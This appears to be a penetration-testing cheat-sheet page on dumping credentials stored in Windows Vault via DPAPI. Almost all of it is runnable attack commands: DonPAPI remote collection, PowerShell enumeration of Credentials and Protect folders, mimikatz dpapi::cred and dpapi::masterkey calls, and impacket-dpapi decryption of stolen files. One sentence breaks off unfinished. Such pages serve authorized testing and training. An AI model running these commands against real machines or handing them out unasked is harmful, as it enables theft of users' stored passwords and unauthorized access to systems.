# Dumping Credentials from Windows Vault

We may be able to retrieve credentials if Windows Vault credentials are stored some folders.

### Automation <a href="#automation" id="automation"></a>

Using [DonPAPI](https://github.com/login-securite/DonPAPI), we can dump credentials remotely.

```
donpapi collect -u 'username' -p 'password' -d example.local --dc-ip <target-ip> -t ALL --fetch-pvk
```

### Manual Dumping <a href="#manual-dumping" id="manual-dumping"></a>

#### 1. Enumerate Credentials <a href="#id-1-enumerate-credentials" id="id-1-enumerate-credentials"></a>

```
# Under %APPDATA% folder
Get-ChildItem C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\

# Under %LOCALAPPDATA% folder
Get-ChildItem C:\Users\<user>\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\<user>\AppData\Local\Microsoft\Credentials\
```

#### 2. Dump Credential Information <a href="#id-2-dump-credential-information" id="id-2-dump-credential-information"></a>

```
mimikatz # dpapi::cred /in:C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\123ABC...
# or
mimikatz # dpapi::cred /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\123ABC...
```

We can retrieve the `guidMasterKey` value that is used for the next section.

#### 3. Decrypt MasterKey <a href="#id-3-decrypt-masterkey" id="id-3-decrypt-masterkey"></a>

The DPAPI keys are stored under `%APPDATA%\Microsofr\Protect\` or `%LOCALAPPDATA%\Microsoft\Protect\` folder. These keys are used for encrypting

```
# Under %APPDATA%
Get-ChildItem C:\Users\<user>\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\<user>\AppData\Roaming\Microsoft\Protect\
dir C:\Users\<user>\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\<user>\AppData\Roaming\Microsoft\Protect\{SID}\
Get-ChildItem -Hidden C:\Users\<user>\AppData\Roaming\Microsoft\Protect\{SID}\
dir C:\Users\<user>\AppData\Roaming\Microsoft\Protect\{SID}\

# Under %LOCALAPPDATA%
Get-ChildItem C:\Users\<user>\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\<user>\AppData\Local\Microsoft\Protect\
dir C:\Users\<user>\AppData\Local\Microsoft\Protect\
Get-ChildItem C:\Users\<user>\AppData\Local\Microsoft\Protect\{SID}\
Get-ChildItem -Hidden C:\Users\<user>\AppData\Local\Microsoft\Protect\{SID}\
dir  C:\Users\<user>\AppData\Local\Microsoft\Protect\{SID}\
```

Now decrypt the master keys:

```
# /rpc: Remotely decrypt the MasterKey
mimikatz # dpapi::masterkey /in:C:\Users\<user>\AppData\Roaming\Microsoft\Protect\{SID}\{STRING} /rpc
```

We can get the `key` value that is the decrypted Master Key.

Alternatively, we can use `impacket-dpapi` command in our attack machine. We need to download the protected file under the `C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<sid>\` in the target Windows machine.

```
impacket-dpapi masterkey -file <protected_file> -sid <user_sid> -password <password>
```

#### 4. Dump Credentials <a href="#id-4-dump-credentials" id="id-4-dump-credentials"></a>

We can dump credentials using the collected Credential value and decrypted Master Key (domainkey).

```
# Specify '/<guidMasterKey>::<masterkey>'
mimikatz # dpapi::cred /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\123ABC... /01234567-890abcde...::abcdef...
```

Alternatively, we can use `impacket-dpapi` command in our attack machine. We need to download the credential file under the `C:\Users\<user>\AppData\Roaming\Microsoft\Credentials` in the target Windows machine.

```
impacket-dpapi credential -file <credential_file> -key <decrypted_key>
```

### References <a href="#references" id="references"></a>

* [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords)
* [The Hacker Recipes](https://tools.thehacker.recipes/mimikatz/modules/vault/cred)
